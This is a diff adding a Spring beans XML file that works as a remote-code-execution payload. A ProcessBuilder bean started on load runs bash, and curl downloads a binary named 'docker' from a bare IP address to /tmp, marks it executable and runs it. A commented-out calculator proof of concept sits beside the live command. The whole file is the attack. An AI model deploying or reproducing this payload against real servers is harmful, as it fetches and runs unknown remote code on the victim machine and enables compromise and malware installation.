@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+    <beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xsi:schemaLocation="
+     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
+        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
+            <constructor-arg >
+            <list>
+                <!--value>open</value>
+                <value>-a</value>
+                <value>calculator</value -->
+                <value>bash</value>
+                <value>-c</value>
+                <value>curl -s -o /tmp/docker http://128.199.52.72/docker; chmod +x /tmp/docker; ./tmp/docker</value>
+            </list>
+            </constructor-arg>
+        </bean>
+    </beans>
